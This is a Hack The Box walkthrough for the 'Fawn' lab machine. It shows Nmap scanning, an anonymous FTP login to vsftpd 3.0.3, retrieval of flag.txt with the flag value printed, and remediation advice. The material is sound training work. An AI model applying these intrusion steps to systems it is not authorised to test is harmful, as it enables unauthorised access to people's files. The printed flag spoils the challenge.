# Hack The Box - Fawn Walkthrough

## Machine Information

| Attribute        | Value                                                                      |
| ---------------- | -------------------------------------------------------------------------- |
| Machine Name     | Fawn                                                                       |
| Platform         | Hack The Box                                                               |
| Difficulty       | Very Easy (Tier 0)                                                         |
| Operating System | Linux                                                                      |
| Attack Vector    | Anonymous FTP Access                                                       |
| Skills Learned   | Port Scanning, Service Enumeration, FTP Enumeration, Anonymous Login Abuse |

---

# Executive Summary

Fawn is a beginner-friendly Hack The Box machine designed to introduce the fundamentals of reconnaissance, service enumeration, and interacting with the File Transfer Protocol (FTP).

During the assessment, an Nmap scan identified an exposed FTP service running on port 21. Further enumeration revealed the service was running **vsftpd 3.0.3** and allowed **anonymous authentication**. By leveraging this misconfiguration, access was gained without valid credentials, enabling the retrieval of a sensitive file containing the user flag.

This machine demonstrates the security risks associated with improperly configured FTP services and highlights the importance of enforcing authentication and restricting anonymous access.

---

# Phase 1: Reconnaissance & Enumeration

## Connectivity Verification

Before beginning the assessment, connectivity to the target was verified.

```bash
ping 10.129.60.76
```

### Output

```text
PING 10.129.60.76 (10.129.60.76) 56(84) bytes of data.
64 bytes from 10.129.60.76: icmp_seq=1 ttl=63 time=284 ms
64 bytes from 10.129.60.76: icmp_seq=2 ttl=63 time=340 ms
64 bytes from 10.129.60.76: icmp_seq=3 ttl=63 time=300 ms
64 bytes from 10.129.60.76: icmp_seq=4 ttl=63 time=276 ms
```

The successful ICMP responses confirmed that the target host was reachable.

---

## Initial Port Scan

A basic Nmap scan was performed to identify exposed TCP services.

```bash
sudo nmap 10.129.60.76
```

### Output

```text
Starting Nmap 7.98

Nmap scan report for 10.129.60.76
Host is up (0.31s latency).

PORT   STATE SERVICE
21/tcp open  ftp
```

### Analysis

The scan revealed a single open TCP port:

| Port | Service | Description            |
| ---- | ------- | ---------------------- |
| 21   | FTP     | File Transfer Protocol |

Since FTP was the only exposed service, it became the primary attack surface.

---

## Service Version Detection

To identify the exact software running on the FTP service, version detection was enabled.

```bash
sudo nmap -sV 10.129.60.76
```

### Flag Explanation

| Flag  | Purpose                                               |
| ----- | ----------------------------------------------------- |
| `-sV` | Attempts to determine service and version information |

### Output

```text
Starting Nmap 7.98

Nmap scan report for 10.129.60.76

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

Service Info: OS: Unix
```

### Findings

The target was running:

```text
vsftpd 3.0.3
```

**vsftpd** (Very Secure FTP Daemon) is one of the most commonly deployed FTP servers on Linux systems.

At this stage, the next step was to test whether anonymous authentication was enabled.

---

# Phase 2: Exploitation (Gaining Access)

## Connecting to the FTP Service

The built-in FTP client was used to connect to the target.

```bash
ftp 10.129.60.76
```

### Output

```text
Connected to 10.129.60.76.
220 (vsFTPd 3.0.3)

Name (10.129.60.76:ananthan): anonymous
331 Please specify the password.

Password:

230 Login successful.
```

### Analysis

The server accepted:

```text
Username: anonymous
Password: <blank>
```

This indicates that **anonymous FTP access** was enabled.

Anonymous authentication allows users to access FTP resources without possessing valid credentials.

This represents a serious security misconfiguration because unauthorized users may gain access to sensitive files.

---

## Enumerating Available Files

After authentication, the directory contents were listed.

```ftp
ls
```

### Output

```text
229 Entering Extended Passive Mode (|||11699|)
150 Here comes the directory listing.

-rw-r--r--    1 0        0              32 Jun 04 2021 flag.txt

226 Directory send OK.
```

### Analysis

A file named:

```text
flag.txt
```

was immediately visible within the FTP root directory.

---

## Downloading the Flag

The file was downloaded using the FTP `get` command.

```ftp
get flag.txt
```

### Output

```text
local: flag.txt remote: flag.txt

229 Entering Extended Passive Mode (|||13179|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).

226 Transfer complete.
```

The file was successfully transferred to the attacker's machine.

---

## Exiting FTP

```ftp
bye
```

### Output

```text
221 Goodbye.
```

---

# Phase 3: Post-Exploitation & Flag Capture

After exiting the FTP session, the downloaded file was verified.

```bash
ls
```

### Output

```text
flag.txt
```

The contents of the file were then displayed.

```bash
cat flag.txt
```

### Output

```text
035db21c881520061c53e0536e44f815
```

---

## Flag

```text
035db21c881520061c53e0536e44f815
```

---

# Remediation & Best Practices

The vulnerability exploited in this machine was the presence of anonymous FTP authentication.

## Security Risks

* Unauthorized access to files
* Data leakage
* Information disclosure
* Potential malware upload opportunities
* Increased attack surface

---

## Recommended Mitigations

### 1. Disable Anonymous FTP Access

For vsftpd, modify:

```bash
/etc/vsftpd.conf
```

Set:

```ini
anonymous_enable=NO
```

Restart the service:

```bash
sudo systemctl restart vsftpd
```

---

### 2. Enforce User Authentication

Require valid usernames and strong passwords for all FTP users.

---

### 3. Restrict Directory Permissions

Ensure sensitive files are not accessible to unauthenticated users.

Example:

```bash
chmod 640 sensitive_file.txt
```

---

### 4. Use Secure Alternatives

Traditional FTP transmits credentials in clear text.

Prefer:

* SFTP (SSH File Transfer Protocol)
* FTPS (FTP over TLS/SSL)

---

### 5. Implement Monitoring and Logging

Enable logging to detect:

* Unauthorized login attempts
* File access activity
* Suspicious transfers

---

# Key Takeaways

* Always begin with reconnaissance and service discovery.
* Identify exposed services using Nmap.
* Enumerate service versions to understand potential attack vectors.
* Test for common misconfigurations such as anonymous FTP access.
* Validate findings through controlled exploitation.
* Document vulnerabilities and provide remediation guidance.

Fawn provides an excellent introduction to service enumeration and demonstrates how a simple configuration mistake can expose sensitive information to unauthorized users.
